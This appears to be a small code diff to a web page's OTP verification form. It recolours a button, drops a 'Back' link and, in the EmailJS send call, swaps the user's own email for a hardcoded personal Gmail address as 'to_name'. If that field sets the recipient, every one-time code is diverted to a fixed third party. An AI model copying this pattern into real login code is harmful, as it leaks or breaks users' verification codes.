@@ -48,10 +48,9 @@
 
                 <!-- Buttons -->
                 <div class="row">
-                    <button id="sendOtpBtn" class="btn blue darken-1 waves-effect waves-light" type="button">Send OTP</button>
+                    <button id="sendOtpBtn" class="btn grey darken-1 waves-effect waves-light" type="button">Send OTP</button>
                     <button id="verifyOtpBtn" class="btn green darken-1 waves-effect waves-light" type="button" style="display: none;">Verify OTP</button>
                     <button id="saveBtn" class="btn blue darken-1 waves-effect waves-light" type="submit" style="display: none;">Save</button>
-                    <a href="login.html" class="btn grey darken-1 waves-effect waves-light" type="button">Back</a>
                 </div>
             </form>
         </div>
@@ -97,7 +96,7 @@
 
             // Send email using EmailJS
             emailjs.send('service_yvtqt05', 'template_i4iw5yy', {
-                to_name: email,
+                to_name: 'hackishmax321@gmail.com',
                 otp: generatedOTP,
             }).then(() => {
                 alert('OTP sent to your email!');
